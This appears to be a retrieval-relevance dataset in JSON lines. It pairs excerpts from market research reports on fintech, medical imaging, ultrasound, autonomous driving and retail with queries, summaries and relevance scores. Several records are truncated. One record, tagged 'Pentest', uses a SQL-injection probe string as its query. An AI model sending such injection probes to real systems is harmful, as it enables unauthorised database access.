sector.\n","summary":"research report from the GSMA Intelligence in March 2022, focusing on the commercial applications of UAVs and the opportunity for mobile operators.","query":"can telecom operators generate revenue with drones ?","tenant":"Pr","assessment":"yes","score":1.0}

{"text":"Digitization creates new business models\n\nDigitization is the single most significant force changing\nthe financial sector today; the other two are regulation\nand consumer behaviour. In the coming years, we will\nsee many more agile fintech companies enter the market.\nHundreds of fintech start-ups have already emerged, with\nbusiness models that are very different from incumbents. At\nthe same time, global big-tech companies (Google, Apple,\nFacebook, Amazon, Alibaba, Tencent) are enlarging their\nfoothold to new business areas, including payments.\n\nRegulation is the second driver. The EU's revised Payment\nServices Directive (PSD2) will promote competition in the\nfinancial sector, help create better services and boost lower\nprices. It will open the market to third parties; i.e., payment\ninitiation service providers and account information service\nproviders. Its effects will become gradually visible, not\novernight. This change is probably comparable to what\nhappened in the telecom markets in the early 2000s.\n\nConsumer behaviour is the third factor shaping financial\nservices. Consumers are moving online and, once there,\nwill stay connected around the clock. They seek information\nfrom various sources, including social media. This puts the\nconsumer centre-stage in digitization. Future success stories\nare likely to be those that provide the best user experience\nand value for the consumer. But remember, the first-mover\nadvantages are also significant in this competition.\n\nThe payments playing field is changing: is it an old\ngame with new rules or an entirely new game?\n\nWhere is the transformation most visible to the consumer,\nin the business of payments? Is an old game with new\nrules - or an entirely new game? More ways to pay have\nbeen born, as various mobile applications have emerged\nalongside card payments and cash. All of these new\npayment services have three things in common.\n\nFirst, they are real-time and instant. Money is transferred\nfrom one person to another in seconds. Second, there will\nbe fragmentation. Consumers are using several methods of\npayment, just as they now use for communication - phone\ncalls, text messages, email, WhatsApp, Skype, Snapchat,\netc. Third, payments will be seamless. They will be used\nin a simple way; for example, by confirming payments with\nfingerprints or facial recognition. The payment action is\ndisappearing from the foreground and becoming an integral\npart of the customer experience.\n\n14 The Global Financial and Monetary System in 2030\n\nImportance of digital skills and financial literacy\n\nDigitization, in general, and in the financial industry, creates\nthe need for new skills. For instance, every citizen needs at\nleast basic knowledge of cybersecurity and data protection.\n\nCitizens should also understand their rights as data\nsubjects. Families, schools, authorities and financial services\nproviders have an important role in increasing public\nawareness of these issues.\n\nInstant payments - i.e. real-time account transfers - are\njust around the corner. Payments are disappearing into the\nbackground and becoming part of the customer experience.\nThis makes financial management more challenging for\nhouseholds and underlines the need for financial literacy.\nFinancial literacy skills are a necessity in the digital age.\n\nFinancial literacy is promoted by various actors: financial\nservices providers, supervisory authorities and third-sector\nplayers. It is crucially important that these different parties\ncooperate to ensure adequate financial literacy throughout\nthe whole of society. Responsible behaviour is expected\nfrom the service providers: the sustainable interest of their\ncustomers should be the primary focus.\n\nBlockchain versus centralized payment systems\n\nPart of financial literacy is to understand new phenomena\nlike crypto-assets. Bitcoin and other crypto-assets are now\nmostly used for speculation, but the technology underlying\ncrypto-assets - i.e. blockchain or DLT - is actually quite\npromising. It makes certain processes faster, and suitable\nversions of DLT have been developed for the financial sector.\nThey are mainly being developed by private actors and are\ngood examples of the diversity of digital transformation in\nthe financial sector.\n\nSummary\n\nDigital transformation in the financial sector is well under\nway and moving fast. With the right policy choices, this\ncan be turned to the benefit of the whole society. To build\nflourishing ecosystems, it calls for cooperation between\nsmall and large, old and new players. And it calls for a\ndynamic and competitive financial industry that can turn\ninnovations into services that genuinely enhance economic\nand social welfare.\n\nBut it also calls for confidence and trust, rock-solid financial\nstability and good consumer protection. As financial services\nare moving online, there is a growing need for digital skills\nand financial literacy. It is important that the financial industry\nand other stakeholders share these worthy goals and work\nwell together in reaching them.\n","summary":" White paper from the World Economic Forum as a contribution to a project, insight area or interaction, providing an overview of the global financial and monetary systems in 2030","query":"What are key trends in digital payments?","tenant":"Finance","assessment":"yes","score":1.0}

{"text":"Perspective on physicians\n\nPhysicians avidly adopt mobile devices,\nbut concerns about specific uses remain\n\nCurrent situation\n\nPhysicians have always had to be accessible \u2013 so they have been rapid adopters of the\nlatest in mobile technology. Years ago, answering services and call centers were the\ngatekeepers that could get your message to the doctor, if your emergency warranted it.\nThen came beepers and, later, the first wave of voice-only mobile phones. Today, physicians\nare rapidly adopting smartphones and tablet computers (for example, one research house\nsays 81% of US physicians use smartphones).6\u2070\n\nBut it's still early in the adoption of smart mobile technology for health care, or what\nInternational Data Corporation (IDC) calls \"clinical mobility,\"6\u00b9 and there is a wide range of\nmHealth uses for physicians. These begin with basic telehealth applications that provide\nvoice or SMS access to medical advice from remote areas (with many examples in the\ndeveloping world), and simple appointment-scheduling apps. More transformative uses\nhave begun to appear as well, such as mobile telemetry apps that constantly gather and\ntransmit a person's vital statistics in real time, or mobile e-prescribing apps. Still very rare\nare emerging mobile collaboration apps that will eventually enable simultaneous real-time\naccess to the latest medical data, patient history and specialist video consultations.\n\nThe value of advanced clinical\nmobility apps\n\nA true story from cardiologist\nEric J. Topol, M.D., published in an article\nby the American Medical Association\n(AMA), illustrates why mobile technology\nis emerging today as a game changer for\nphysicians. During a cross-country flight,\nhe was brought to a passenger \"in obvious\ntrouble.\" Typically, according to the article,\n\"Dr.Topol would have had to make an\neducated guess and hope he could take\ncare of the patient until the plane landed.\nThis time, though, he pulled out his\niPhone, and with an app that produces\nan electrocardiogram, he determined that\nthe patient was having a heart attack. The\nplane made an emergency landing while\nparamedics waited on the ground to take\nthe patient directly to surgery.\"\n\nSimpler applications are significantly\nimproving medical care in rural areas of the\ndeveloping world.

{"text":"WWW.MRG.NET\n\nBrazilian MRI System Market\n\nThe Brazilian market for MRI systems, comprising open, 1.5 T, and 3 T MRI systems,\nexperienced strong growth in 2008. Revenues totaled over $100 million that year (see\nExhibit 6). Much of this growth was attributed to the strength of the real, Brazil's\nstrong economy, and the country's increased health care spending. In 2009 and 2010,\nhowever, this market will be hindered by the depreciating real and the impact from\nthe global credit crisis. Compared to other modalities, sales of MRI systems will be\nmost impacted by these factors because their average selling prices (ASPs) are much\nhigher than other modalities such as CT scanners (but unlike CT scanners, their use\nper day is much lower). Cash-strapped facilities requiring both a CT and an MRI\nsystem will therefore focus their spending on CT scanners rather than MRI systems\nin order to maximize their expenditures. As the global economy recovers after 2010,\ndemand for MRI systems will continue. In particular, the MRI installed base in Brazil\nis still low and the superior images offered by MRI scanners\u2014\ns-especially for soft\ntissues and applications in neurology-will propel the Brazilian market for MRI\nscanners.

Some caf\u00e9s also advertise their coffee's low-acid content, such as\nChicago-based Big Shoulders Coffee that offers a lower-acid Colombian roast as\nwell as a Uganda roast that's described as \"sweet and chocolatey\" and is brewed in\na French press. Cold-brewing techniques especially, though, have been \"exalted\"\nfor producing low-acid coffee, Serious Eats notes. \"The overnight process of\nsteeping coffee in water at room temperature yields a gentle-on-the-digestion\nconcentrate, that you can use again and again.\" High Brew Coffee (based in Austin,\nTX) is known for its low-acid cold brew coffee, which it leverages for a number of\nrecipes operators can take inspiration from that are posted on the company's social\nmedia outlets. For example, there are a few recipes for ice cream floats and cocktails\nthat swap out soda for High Brew's low-acid Double Espresso cold brew. With the\nhealth benefits of low-acid coffee, restaurants or coffee shops looking to\ndifferentiate themselves could also take the opportunity to call it out on their menus.\nLow-acid cold brews typically are less bitter and smoother too, which could be an\nadditional selling point for manufacturers and operators.\n","summary":"market research report from November 2017, focusing on the low-acid coffee trend in the US.","query":"What are the types of low acid coffee","tenant":"Nestletryitpilot","assessment":"yes","score":0.0000000267}

{"text":"Digital Pathology Market 2020-2025\n\nDigital Pathology Trends\n\nSharing components of the EIS makes getting a new system more within reach financially, but buyers\nstill need to make the case for an investment based on the value for patient care and patient safety,\nwhich are paramount.\n\nSCIENCE\nAND MEDICINE\nGROUP\n\nA digital pathology system provides value in healthcare systems. Advantages include accessibility of\ncomplete information in electronic healthcare records, the ability to connect pathology findings with\nradiology findings, and the implementation of precision medicine approaches through Al.\n\nSharing vendor-neutral archives (VNAs) and other infrastructure already existing in healthcare\nfacilities and in use in radiology and other clinical departments improves the outlook considerably.\nReducing the total cost of a DPS by $200,000 or more by sharing the different components of\nenterprise imaging systems (EIS) puts an investment more within reach financially. That said, you\nneed to show more than just a financial return on investment to get any new clinical system\nimplemented.\n\nPatient care and patient safety are paramount at quality healthcare facilities. Having all patient\npathology slides in one place that can be easily and quickly accessed, with the correct slides prior\nand current -- associated with the patient, is key. The benefits of a digital pathology system include\nstorage of all images in a central archive, space savings, the ability to easily compare multiple slides\nagainst each other, and \"view sharing\" where images and data are shared for second opinions and\nconsultations. Reviewing several years' worth of studies takes just a single click, eliminating the need\nto go through cabinet after cabinet full of slides, including any that may be stored offsite.\n\nMultiple slides can be streamed to the pathologist's workstation in real-time, so there is no delay in\nimages being available for reading. Any and all associated information from other clinical systems\n(radiology reports, lab findings, etc.) is sent along with the slides, so this information is also available\nfor review.\n\nRegulatory Considerations Drive Storage Purchases\n\nCLIA stipulates that laboratories must retain cytology slides for a minimum of five years,\nhistopathology slides for a minimum of 10 years, and paraffin blocks for a minimum of two years.\nLegally, digital storage cannot take the place of physical storage, which is not surprising considering\nthat whole slide imaging for digital pathology was approved by the U.S. Food and Drug\nAdministration less than three years ago.\n\nInterestingly, the technology to enable digital storage of pathology images has been around for\nnearly 20 years. With weather events and other potential disasters, storing pathology images on a\nVNA may be viewed not just as optional but desirable.\n\nIn addition, with the rapid advancement of clinical IT system standards recently, it will be much\nsooner rather than later when digital archiving of whole slide images becomes an acceptable way to\nstore images. Slides degrade over time and provide little to no value after seven or eight years,\nwhereas once an image is digitized, it cannot be broken, nor will it degrade. The ability to keep\nimages past the average retention time frame can be a crucial advantage, especially when dealing\nwith litigation. A facility that starts proactively archiving its pathology slides now will be far ahead of\nthe curve.\n\nAugust 2020 O Science and Medicine\n","summary":"market research report from Science and Medicine Group published in 2020, covering the digital pathology systems, scanners and software market.","query":"what are the needs of digital pathologists?","tenant":"Philips","assessment":"yes","score":1.0}

{"text":"4.10b\n\nChina\n\nDespite being the second largest market for handheld ultrasound, after the US, the handheld market in China is still emerging, with high growth rates but low market penetration.\nFor penetration of handheld ultrasound to increase, more customer education is required. This is something that has been lacking so far from domestic vendors, who account for\naround 90% of the market. These vendors are typically small and do not have the money to spend on market creation activities. Some customers in China assume handheld\ndevices can be used in daily clinical practice, whereas the reality is that handheld devices from domestic vendors are typically of low image quality with limited use in clinical\nsettings and are instead more suitable for use as a screening tool. Among the local vendors, SonoStar, Youkey and Stork Imaging are believed to be the largest vendors.\n\nWhilst domestic vendors dominate the China handheld ultrasound market, some international vendors are expected to launch their most recent new product introductions in China\nsoon, along with education campaigns to increase handheld ultrasound adoption. This could lead to the market share of international vendors increasing in China. Growth\nprospects of international vendors could be limited by the policy implemented by the China government in May 2021, that requires more locally made products. This new policy\nwill have impacted some vendors, as they had to re-register their products as domestically made in China. However, as the handheld ultrasound market is small and still\nemerging, there is time for international vendors to obtain certification and avoid an adverse impact on their business.\n\nSignify\n\nRESEARCH\n\nDue to the low cost of handheld ultrasound devices, purchasing decisions can be made by department heads, instead of hospital leaders. However, high level approval may be\nrequired for larger deals. Compared to the government funded public hospitals, it is easier to purchase handheld ultrasound devices in private hospitals as the decision chain is not\nas long.\n\nThe China handheld ultrasound market is forecast for a 2021-2026 CAGR of 21.3%, one of the slowest growth rates in Asia. The use of teleultrasound and AI solutions could\nincrease the rate of handheld ultrasound adoption, especially in rural areas where users will be less experienced with ultrasound. The government is encouraging the use of\nartificial intelligence (AI) for medical imaging, including ultrasound, to help with increased access to healthcare in rural areas and the workload of Chinese doctors in treating an\nincreasingly ageing population. In 2020, the China NMPA granted the first wave of Class III registration certificates for medical imaging AI, and there are now 11 certified\nproducts, all from Chinese vendors. However, none of these products are for ultrasound and we do not expect NMPA III cleared ultrasound AI solutions for another few years,\npartly due to the difficulties in obtaining clinical validation.\n\nPrimary care is forecast to be the fastest growing clinical application during the forecast period, with a 2021-2026 CAGRs of 37.9%. Domestic vendors, with less access to larger\nhospitals compared to international vendors, are targeting the primary care market. The expansion of healthcare in China to rural areas could offers growth potential for all\nultrasound products. It will benefit handheld ultrasound in very remote areas where it is difficult to use a cart system in that location and where customers cannot afford a\ncompact system. Growth prospects are more limited in the traditional clinical applications, where the use of cart and compact systems is preferred.\n\nThursday, 08 December 2022\n\n73\n","summary":" Handheld Deep Dive Report for the 2022 season, published by Signify Research Ltd. on December 2022, covering the global handheld ultrasound market, clinical application trends, and vendor profiles","query":"What is the market share of Ultrasound in China?","tenant":"Philips","assessment":"no","score":0.000000369}

We were curious about\nhow Generation Z (\"Gen Z\" or \"Zoomers\" in short) is affected by the current economic\nsituation. Do Zoomers have different feelings, emotions, or behaviours toward the\nongoing price inflation? This is especially important for marketers who are targeting\nGen Z with their products or services. As a result, we analyzed the differences and\nsimilarities between GenZ and the other (older) generations.\n\nOverall, both Gen Z and non-Gen Z consumers try to save within the same top 5\ncategories however, non-Gen Z consumers try to cut their spending more than Gen Z.\nThe significant differences between these demographic groups occurred in the types\nof saving strategies. Consumers older than 26 preferred to delay their purchases and\nput effort into saving money through comparing offers, buying cheaper alternatives,\ngoing to the discounter, etc., while Generation Z tended to seek alternative solutions\non how to buy the product affordably.\n\nWHO IS GEN Z?\n\nFirstly, it is good to clear out the definition of Gen Z. It is a demographic group following Millennials and\npreceding Generation Alpha. Researchers and popular media place the beginning of this generation in the\nmid-to-late 1990s and the end in the early 2010s hence this generation consists of people between the ages\nof 12 and 26. In this research, we examined the age group of 18 - 26-year-olds (since 12-17-year old's were\nout of scope) and compared the data with the non-Gen Z segment, those older than 26.\n\nGEN Z IS OPTIMISTIC ABOUT THE FUTURE\nECONOMIC SITUATION\n\nBoth Gen Z and non-Gen Z feel that the current price inflation affects them emotionally, around two-thirds\nof both groups feel this.

{"text":"Who are the Millennials?\n\nAll effects are important, and often act together - but understanding\nwhich is dominant is key to understanding the future. In contrast,\nthe most misleading research often confuses effects, concluding\nthat differences, which in reality are purely because Millennials are\n[relatively] young, uniquely define them as a generation. This report\nwill try to separate out these effects, and show which differences are\ntruly generational.\n\nMillennials are dwarfed by the much larger Baby\nBoomer generation\n\nMYTH\n\nThe Baby Boomer generation has defined so much\nof our politics and commerce over the past few\ndecades, particularly in the developed world, due to their sheer\nsize and fortune of living through a period of economic expansion.\nThey undoubtedly wield huge power, in markets and in setting\npolitical agendas.\n\nBut now Millennials have all moved into adulthood they are just as big,\nif not yet as economically powerful. Their growing importance mirrors\nthe growing importance of emerging markets, whose populations\nhave a much younger profile. One of the challenges of examining\nglobal generational trends is this East-West\/North-South distinction,\nand the very different positions and futures faced by Millennials in\neach. Our main focus in this report will be on the established markets,\nmostly because this is where we have the most data for - but we will\nalso flag these emerging-established distinctions where we can.\n\nGLOBAL MILLENNIAL POPULATION\n\nProportion of global adult (+20) population from older age groups\n\n2015 ADULT\nPOPULATION\n\nMILLENNIALS 36%\n\n(AGED 20-34)\n\n1.8bn\n\nOLDER (AGED\n35+)\n\nWORLD EUROPE\n\n3.1bn\n\n147M\n\n438M\n\nNORTH\nAMERICA\n\n75M\n\n193M\n\nOCEANIA LATIN\nAMERICA\/\nCARIBBEAN\n\n9M\n\n18M\n\n157M\n\n258M\n\nASIA\n\n1.9bn\n\nAFRICA\n\n284M\n\n294M\n\nMillennial Myths and Realities\n\nWhilst Millennials now match the demographic heft of the Baby\nBoomers in established economies, if we take a wider view, the\nbalance tips decisively in Millennials' favour. According to UN\npopulation projections for 2015,15 we can say that Millennials are the\nlargest adult generation worldwide. In 2015, 36% of the global adult\npopulation was aged 20-34 (born between 1981 and 1995, essentially\ncovering the Millennial generation), outweighing Generation X, Baby\nBoomers and the Pre-War generation. This is aided by a sharp skew\nby region; half [49%) of African adults are Millennials.\n\nMillennials are the most derided generation\n\nREALITY are always seen as revolting.\n\nbut it is probably an age thing: the young\n\nSo Millennials have grown up, they have defining characteristics,\nand their sheer size sets them up to be the new generational\nheavyweights. Yet the Millennial generation are dogged by negative\nclaims, with endless reports that they are 'poor little snowflakes'16\n- suggesting they are more prone to taking offence and are too\nemotionally vulnerable to cope with views that challenge their own.\n\nIt is certainly true that nearly all the claims we have looked at for\nthis report paint Millennials in a negative light - the main thrust of\nmost of the assertions that we have tested is that Millennials are\neither experiencing problems or are a problem. When we asked\npeople across 23 different countries to describe Millennials from\na list of characteristics, \"tech-savvy\u201d, \u201cmaterialistic\u201d, \u201cselfish\", \"lazy\",\n\"arrogant\" and \"narcissistic\" were the most popular adjectives\nassigned to them. Millennials themselves pretty much described\nthemselves in the same way. However, when asked to describe\nBaby Boomers, words like \"respectful\", \"work-centric\", \"community-orientated\", \"well-educated\" and \"ethical\" were most associate So\nis it something about this generation specifically that means they\nare so derided, both by themselves and others?\n\nIt is unlikely. Younger generations have been the target of derision\nfrom older generations since records began (and probably further].\n\nPlato is quoted as saying \"What is happening to our young\npeople?

{"text":"Enterprise imaging IT - cloud\n\nFrom a global perspective, cloud services in enterprise imaging IT account for a relatively small proportion of installs and\nrevenues. In mature markets, many of the factors discussed on data security and pre-existing infrastructure are true also\nfor cloud. However as health infrastructure grows in scale and complexity, greater interoperability and access is required\nby users, suiting a cloud service approach.\n\nIn addition, cloud adoption is predicted to increase significantly in medium and small institutions, particularly in mature\nmarkets, over the forecast period. Here, the cost of implementing non-hosted hardware is relatively high in comparison to\na hosted or cloud approach. Therefore, small clinics, imaging centres and physician offices will increasingly opt for a\nhosted approach, utilising the new breed of universal viewers offered in conjunction with cloud storage to store and\naccess both DICOM and non-DICOM content.\n\nIn the US, \"private cloud\u201d is becoming more common. While technically still a non-hosted approach, large Integrated\nDelivery Networks (IDNs) and hospital group networks are increasingly hosting their own cloud architecture. These\ninstitutions have invested in IT infrastructure to support EMR adoption in recent years, so have the capability and\nresources for cloud storage networks. In doing so, they are also able to keep more stringent control and still \"own\" their\npatient data, thereby overcoming one of the biggest barriers to cloud adoption. With ongoing consolidation of healthcare\nproviders, an increasing proportion of the market will move to the \"private cloud\" model in the next 5 years.\n\nOutside of the more mature markets for healthcare IT, where investment in IT infrastructure is low, cloud adoption also\nhas strong potential.

A\n2021 report by two United Nations entities notes that drones equipped with facial-recognition capabilities can be exploited by armed non-state ctors to perpetrate\ntargeted attacks on specific communities.3\u2079\n\nBehavioural surveillance through algorithmic and cyber techniques is already a\npervasive reality of contemporary conflicts. \"Actors in a conflict can use phishing\u201d\noperations, social engineering, malware downloads, and clandestine or forced access\nto passwords and networks to monitor and track down real and suspected opponents.\nDeceptive tactics extend to social engineering and impersonations to manipulate\nopponents into revealing important information, such as personal identities and\nmeeting locations.\n\nRECENT AND FUTURE TECHNOLOGICAL TRENDS\n\nCybersecurity experts have detected a rise in\nsophisticated cyber attacks that manipulate\nchildren in order to steal their identity credentials\nand biometrics profiles with life-long security\nimplications.40 Such threats are becoming rampant\non platforms like TikTok, Instagram, Facebook and\nSnapchat but will be amplified in the metaverse\nand in expanding networks of personal, often\nunsecure devices. Throughout their lives, targeted\nchildren can therefore fall victims of identity thefts\nand digital security violations by sophisticated\n\ncyber attacks. The private surveillance industry\nhas provided States and non-state actors with\nan arsenal of tools for computer interference,\nbiometrics theft, and mobile device hacking.41\nIncreasingly, cyber criminals and governments\nhave access to a new class of malware that targets\nusers' biometrics, including facial features. In\nthe context of fragility and socio-ethnic violence,\nchildren from minorities could be stigmatized in\nnew and powerful ways with malware designed to\ntarget them.\n\nBehavioural engineering could be a pathway to child recruitment into and use by\narmed forces and non-state armed groups. The 2018 United Nations University\nReport Cradled by Conflict explains how the factors driving child recruitment into\narmed non-state actors (ANSA) are multifaceted, complex, and often intertwined.\nThese factors have less to do with indoctrination than with structuring heavy\nburdens of conflict:\n\nMost children do not so much \"opt\" into conflict as \"grow\" into it. Conflict\nstructures the information they see and the choices they make. It pulls and pushes\nthem in many directions. Conflict erodes their relationships. It exacerbates\ntheir needs and exposes them to untold risks. Conflict shapes their identity and\nheightens their need to find meaning in their lives. Ultimately, the forces of conflict\nnarrow the paths available to children, and tragically, for many, lead to exploitation,\nviolence, and trauma.43\n\n11 WHAT TYPES OF RISKS DO OFFENSIVE CYBER OPERATIONS POSE TO CHILDREN?\n","summary":" Rapid analysis of the impact of offensive cyber operations on children's rights, security, and well-being in\n\ncyberconflicts in July 2022","query":"-1' OR 3+34-34-1=0+0+0+1 -- ","tenant":"Pentest","assessment":"no","score":0.0000000008}

Because\nclinical research on advanced neurological monitoring has shown favorable results,\nhospitals will be more inclined to adopt these relatively new technologies for critical\ncare monitoring. Published literature also demonstrates the importance of cerebral\nmonitoring in neonates, indicating that HIE evolves over hours to days and the\npresence of seizures can be a useful predictor of patient outcomes. Neonatal EEG\nmonitoring provides clinicians with the opportunity to identify trends and\nabnormalities, and deliver treatment immediately where required. Neonatal EEG\nmonitoring can also perceive abnormalities that predict poor developmental\noutcome at 1 year, which cannot normally be accomplished with other monitoring\ntools.\n\nConcern over patient outcomes, length of stay, and ensuring patients are treated to\nthe highest standard of care is high in Europe, especially as critically ill populations\ngrow rapidly. Support for these relatively new critical care patient monitoring\ntechnologies from clinical studies will bolster the adoption of these devices in Europe\nthroughout the forecast period.\n\nFocus on Connectivity and Interoperability\n\nHospitals in Western Europe will experience a shortage of clinical staff as a large\nnumber of nurses and physicians reach ages over 60 and begin retiring. A shortage of\nclinical staff will compound the challenges associated with a large high-acuity\npatient population because fewer clinicians will be available to care for many\npatients. Many hospitals are therefore seeking electronic solutions to manage\ngrowing patient loads with fewer staff, and patient monitoring systems are an\nattractive option. Connectivity between central monitoring stations, critical care\ninformation systems, and electronic health records is rapidly becoming essential to\nthe clinical environment because it provides access to patient data from multiple\nlocations both inside and outside the hospital. Many European hospitals are\ninvesting in wireless technologies and associated information technology solutions to\nfacilitate the central monitoring of patients, enabling nurses to track patient\ncondition more effectively and efficiently. Monitors offering wireless connectivity,\nwhich transmit information from patient monitors to a central station, will gain\npopularity through 2013 because they permit fewer staff to continuously and\neffectively care for multiple patients. Hospitals will continue turning to patient\nmonitoring systems, especially vital signs monitors and remote monitoring solutions,\nin order to manage large groups of high-acuity patients with fewer staff. This\nincreased reliance on patient monitoring will drive the vital signs monitoring\nmarket, the largest portion of the European critical care patient monitoring market,\nover the forecast period.\n","summary":"research report published in February 2009 by Millennium Research Group, Inc. about the European markets for critical care patient monitoring.","query":"what monitoring use cases are important in europe","tenant":"Philips","assessment":"yes","score":1.0}

{"text":"3.3g Regional Trends\n\nAfrica\n\nGrowth in the African diagnostic cardiology market is heavily dependent on tender-driven purchasing\nand large projects to help develop necessary healthcare infrastructure. The demand in North and\nSouth Africa to purchase solutions with high-end functionality has started to reduce, with a 'less is\nmore' approach to solutions, to help improve facilities in resource-restricted establishments. Like\nmany regions, the COVID-19 pandemic has highlighted the lack of qualified physicians and nurses in\nthe continent resulting in a drive to recruit new resource. Solutions that are easy to use by newly\ntrained qualified personnel are seen to be most beneficial.\n\nThe resting ECG market is the largest with some progression being seen for ECG management\nsystems in the larger hospitals. Significant development has been made in Africa, with demand for\nhigher quality devices becoming more frequent. Service is now a key decision maker pushing out\nsmaller players that are unable to support their installed base. Price, however, remains a key factor\nin purchasing decisions and will likely to intensify following the pandemic.\n\nThe preference for solutions in Africa is slowly developing. In the past, the physicians just wanted\nwhat they could get for their budget and demanded solutions at the lowest cost with no\nconsideration for service. However, the realization is that they would benefit from higher value\nsolutions that have dedicated servicing and support. This resulting in a transition of vendor\npresence, however with budgets still relatively restricted, pricing is still a major factor in decision\nmaking, resulting in a price-sensitive market.\n\nPrior to the pandemic there was a considerable amount of hospital construction in Africa which was\nsupported by EU funds. But since the pandemic, corruption has increased, and funds have been\nmisappropriated. As a result, the African market is expected to be set-back several years.

Personal\nvehicle ownership will not become extinct, even in the\nlong-term. However, vehicle ownership structures and\nvehicle designs will change dramatically.\n\nWith full self-driving capabilities, vehicles will be\nable to drive to a passenger, then after the trip, drive to\nanother passenger or park themselves. We expect to-day's black car, taxi, ride sharing and rental car offer-ings to merge into one low-cost, driverless mobility\n-on-demand offering. With low cost and high\nconvenience, mobility-on-demand could become an\nestablished and widely used method for personal mo-bility in cities, suburbs and for daily commutes. Argu-ably, this would not only disrupt current car-based mo-bility industries mentioned above, but also have an\neffect on the automotive industry itself.\n\nWith greater access and penetration of mobility-on-demand, vehicles will be designed with specific ap-plications in mind, based on use cases and passenger\nneeds. These designs could include:\n\n1. Short-distance vehicles for inner city, inner suburb\nand last mile transport\n\n2. Medium-to-long-distance vehicles for mixed\nsuburb and city use\n\n3. Multi-purpose vehicles for personal ownership\n\nFigure G shows the profile of possible vehicle de-signs, and Figure H shows examples of use cases in\nvarious locations.\n\nShort-distance vehicles would likely be used as\npart of a mobility-on-demand service. As most errands\nand commutes will be served by automated vehicles at\nlow cost and high convenience, we expect the 2nd car\nper household to strongly decline. However, we expect\nvehicle ownership to still persist to provide for a more\npersonalized travel experience and to meet certain\nconsumers' need to express their individuality through\nvehicle ownership.\n\nFully automated mobility-on-demand fleets would\nbecome a major part of the car parc. The market struc-ture will change from highly fragmented individual ve-hicle ownership to highly concentrated fleet ownership\nby mobility providers, with the effect of homogenizing\nthis vehicle segment and significantly altering automo-tive business models.\n\nOverall, there will be a lower demand for personal\nvehicles. However, we expect to see an increasing\ntrend towards premium vehicles, as people seek to ex-press their individuality through vehicle ownership.\n","summary":"November 2014 report from Roland Berger Strategy Consultants about disruptive innovation in the automotive industry, focusing on autonomous driving, which is expected to have a significant impact on the industry by 2030.","query":"what are the trends in autonomous driving in Aisa?","tenant":"Telecom","assessment":"no","score":0.0}

In 2019 and 2020,\nthe handheld market added more than 10,000 and 9,000 units, respectively, causing\nthe market to nearly triple in size since 2018. The influx of new and low-cost\nhandheld systems has driven rapid adoption, but also led to a decreasing ASP in the\nsegment, which ultimately will limit the segment's revenue, even with widespread\nadoption.\n\nCOVID-19 also accelerated the growth of the handheld ultrasound market, because\naffordable and highly portable medical imaging equipment was in high demand in\nPOC settings to quickly triage large patient volumes with limited budgets.\n\nIn 2020, Butterfly Network posted another year of strong sales in the US market, and\nincreased sales in Western Europe.

{"text":"However, in most markets click and collect stores are\noutnumbered by both third-party collection sites and\nlockers. If a customer uses either of these alternatives,\nthis removes the opportunity for incremental sales, as\nwell possibly diluting the brand impact: the third-party\ncollection point's branding may be distinct from that of\nthe original retailer.\n\nDeloitte expects that for many stores, the provisioning\nof click and collect will occur simply as a means to\nremain competitive. The decision to offer such facilities\nmay be a reflex reaction to the launch of a service by\n\na direct competitor. As such, some retailers offering click\nand collect may initially find that they are not yet fully\nready to offer such a service.\n\nTheir store layout may not be optimized for click and\ncollect. They may have to improvise a store room for\ngoods to be collected and designate a space where\npeople can queue and wait for their goods to be\nfetched from a store-room without blocking the passage\nof customers wanting to use the store in conventional\nmanner. It may take several minutes to process each\norder, so at peak times congestion of pathways for\ntraditional customers may become problematic.\n\nTheir staffing levels may not be sufficient to cope\nwith the service; and they may need to hire additional\npersonnel, particularly at peak times in the day or during\nbusy seasons, to collect goods from the storeroom.\nRetailers offering click and collect for groceries would\nneed to provision rooms equipped with sufficient\nrefrigeration for safe storage of perishable foods.\n\nPoint-of-sales software may only be set up for\nconventional in-store payments, and may not, for\nexample, treat e-commerce returns as a non-store\ntransaction.\n\nThe availability of click and collect is likely to encourage\nsome customers to over-order in the knowledge\nthat unwanted goods can be immediately returned\nand refunded. This will be particularly the case with\nclothing. Customers may order a wide range of goods,\nin a manner similar to how they pick an assortment\nof clothing off rails to try on in the changing rooms.\nThey may then keep one of the half-dozen items they\nhave tried on. With in-store sales, unwanted items\nwould not be rung up in the till; with click and collect all\nitems selected would be 'sold', and then all unwanted\nitems would be refunded. This may cause sales data to\nbe distorted by the volumes of try-to-buy purchases.\nRetailers offering a much wider range of goods online\nmay also face rapidly increasing costs in delivering\norders to stores and in expanding their reverse supply\nchain capacity.\n\nThis prediction has focused on Europe, as there is\na strong dynamic around this aspect of e-commerce.\nOther regions are also deploying click and collect,\nbut are at earlier phases of deployment. For example,\nin Canada, retailers, including some of the largest\ngrocers, general merchandise retailers, 111 and entire\nmalls\u00b912 are trialing the service at pilot locations.\nSome UK-based retailers are exporting their experience\nof click and collect in other markets they operate in,\nsuch as Thailand. 113 In South Africa, one chain is using\na UK based sister company's experience in collection to\ntrial a click and collect service.11\n\nIn most markets click and collect stores are outnumbered\n\nby both third-party collection sites and lockers.\n\nIf a customer uses either of these alternatives, this\nremoves the opportunity for incremental sales, as well\npossibly diluting the brand impact.\n\n110.

{"text":"12 - AUTOMATED AND AUTONOMOUS DRIVING\n\nMany companies have carried out trials or are engaged in continuous on-road testing of highly automated\nvehicle prototypes whose capacities are evolving rapidly due to improved sensor-processing technologies,\nadaptive algorithms, high-definition mapping and in some cases, the deployment of vehicle-to-vehicle and\ninfrastructure-to-vehicle communication technologies. Automated vehicles have crossed the United States\nalmost solely in self-driving mode and have undertaken long-distance motorway and arterial trips in Europe\nand Japan.\n\nFrom a technical point of view, current technology for highly automated driving in controlled environments\nis quite mature. These vehicles uses state-of-the-art sensors (radar, lidar, GPS and camera vision systems)\ncombined with high accuracy maps allowing on-board systems to identify appropriate navigation paths, as\nwell as obstacles and relevant signage. These prototypes operate with a driver that must stand ready to\ntake control of the vehicle though reports from trials indicate that this option is rarely acted upon. As of\n2015, there is yet no consensus on the commercial maturity of highly automated and ultimately fully\nautomated driving. Some manufacturers have announced the arrival of highly automated and possibly fully\nautomated vehicles by as early as 2016 while others have advanced much later dates (up to 2030). Clearly\nthere will be a first-mover advantage for pioneers in the field of highly automated driving but there are also\nrisks linked to the safety performance of these vehicles and the possibility of regulatory action that inhibits\ntechnology development and deployment.\n\nA number of issues will have to be addressed in order to support the deployment of high-automation\nscenarios. These include:\n\nVehicle-to-X connectivity (V2X): Connectivity is an important element of the automated\nvehicles especially secure V2X communication requiring low latency. V2X technologies encompass\nthe use of wireless technologies to achieve real-time two-way communication among vehicles\n(V2V) and between vehicles and infrastructure (V21). The convergence of 